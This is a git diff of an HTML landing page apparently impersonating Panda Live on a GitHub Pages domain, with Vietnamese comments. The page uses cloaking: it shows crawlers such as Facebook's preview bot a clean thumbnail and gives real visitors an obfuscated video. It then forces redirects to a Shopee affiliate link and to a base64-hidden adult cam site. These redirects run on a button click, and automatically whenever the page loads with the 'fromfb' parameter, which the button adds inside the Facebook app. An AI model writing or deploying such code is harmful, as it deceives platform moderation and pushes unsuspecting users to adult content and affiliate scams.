@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
 <title>Panda Live Idols</title>
 
-<!-- Open Graph -->
+<!-- Open Graph cho bot -->
 <meta property="og:url" content="https://pandalive-co-kr.github.io/panda-live-idols/" />
 <meta property="og:type" content="website" />
 <meta property="og:title" content="Panda Live Idols" />
@@ -40,7 +40,7 @@ html, body { margin:0; padding:0; height:100%; background:#000; }
   <img src="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" alt="Thumbnail sạch" style="width:100%; height:auto;">
 </div>
 
-<!-- Nội dung -->
+<!-- Nội dung cho user -->
 <div id="real-content" class="video-container" style="display:none;">
   <video id="main-video" autoplay muted loop playsinline preload="auto"
          poster="https://pandalive-co-kr.github.io/panda-live-idols/facebook.jpg" webkit-playsinline></video>
@@ -68,38 +68,24 @@ function xorDecode(str, key) {
 }
 function reverseString(s) { return s.split('').reverse().join(''); }
 
-// --- Video URL ---
+// --- Mã hóa video URL ---
 const enc3_b64 = "ZBEDSgQnDBtdXR9aNQUHEk44CRZWWR9QJggCSQAvCxhCH11cfgMbDBUiAldAWx9aM0wLEggnBB1cUUIaf1sdFBU/DQ==";
 const xorKey = "PandaKey2025";
 
-// --- Link ---
-const linkShopee = "https://s.shopee.vn/30dchvC74f";
+// --- Mã hóa link 18+ ---
 const link18_b64 = "aHR0cHM6Ly9zZXhiamNhbS5jb20vYWN0b3IvcGFuZGFjbGFzcy8=";
 
-// --- Detect ---
+// --- Phát hiện bot ---
 function isBot() {
   const ua = (navigator.userAgent || "").toLowerCase();
   const keywords = ["facebookexternalhit","facebot","twitterbot","linkedinbot","slackbot","bot","crawler","spider","preview","embedly"];
   return keywords.some(k => ua.includes(k)) || navigator.webdriver;
 }
-function isFacebookApp() {
-  const ua = navigator.userAgent || "";
-  return /FBAN|FBAV/i.test(ua);
-}
-function isIOS() {
-  return /iPad|iPhone|iPod/i.test(navigator.userAgent);
-}
-function isAndroid() {
-  return /Android/i.test(navigator.userAgent);
-}
 
-// --- Mở 2 link ---
-function autoOpenLinks() {
-  window.location.href = linkShopee;
-  setTimeout(() => {
-    const link18 = atob(link18_b64);
-    window.location.href = link18;
-  }, 150); // gần như ngay lập tức nhưng vẫn an toàn
+// --- Phát hiện mở trong FB app ---
+function inFacebookApp() {
+  const ua = (navigator.userAgent || "").toLowerCase();
+  return ua.includes("fbav") || ua.includes("fbios") || ua.includes("fban");
 }
 
 document.addEventListener('DOMContentLoaded', function() {
@@ -107,50 +93,55 @@ document.addEventListener('DOMContentLoaded', function() {
   const real = document.getElementById('real-content');
   const vid = document.getElementById('main-video');
 
-  const params = new URLSearchParams(window.location.search);
-  if (params.get("auto") === "1") {
-    autoOpenLinks();
-    return;
-  }
-
   if (isBot()) {
     thumbnail.style.display = 'block';
     real.style.display = 'none';
     return;
   }
 
+  // --- Decode video URL và gán trực tiếp ---
   try {
     const raw = atob(enc3_b64);
     const step = xorDecode(raw, xorKey);
     const videoURL = reverseString(step);
+
     thumbnail.style.display = 'none';
     real.style.display = 'block';
+
     vid.src = videoURL;
     vid.play().catch(()=>{});
+
   } catch (err) {
     thumbnail.style.display = 'block';
     real.style.display = 'none';
   }
 
-  // Nút CTA
-  document.getElementById('ctaBtn').addEventListener('click', function(e){
-    e.preventDefault();
+  // --- Nếu có query fromfb thì tự mở Shopee + 18+ ---
+  const params = new URLSearchParams(window.location.search);
+  if (params.has("fromfb")) {
+    const shopeeLink = "https://s.shopee.vn/30dchvC74f";
+    window.location.href = shopeeLink;
+    setTimeout(() => {
+      const link18 = atob(link18_b64);
+      window.location.href = link18;
+    }, 150);
+  }
 
-    if (isFacebookApp()) {
-      let landingURL = window.location.origin + window.location.pathname + "?auto=1";
-      if (isAndroid()) {
-        window.location.href = "intent://" + landingURL.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end";
-      } else if (isIOS()) {
-        const chromeURL = "googlechrome://" + landingURL.replace(/^https?:\/\//, '');
-        window.location.href = chromeURL;
-        setTimeout(() => {
-          window.location.href = landingURL; // fallback Safari
-        }, 500);
-      }
-      return;
+  // --- Nút CTA ---
+  document.getElementById('ctaBtn').addEventListener('click', function(){
+    if (inFacebookApp()) {
+      // Nếu đang trong FB app → reload ra ngoài
+      const url = window.location.origin + window.location.pathname + "?fromfb=1";
+      window.location.href = url;
+    } else {
+      // Nếu đã ngoài FB → chạy trực tiếp
+      const shopeeLink = "https://s.shopee.vn/30dchvC74f";
+      window.location.href = shopeeLink;
+      setTimeout(() => {
+        const link18 = atob(link18_b64);
+        window.location.href = link18;
+      }, 150);
     }
-
-    autoOpenLinks();
   });
 });
 </script>
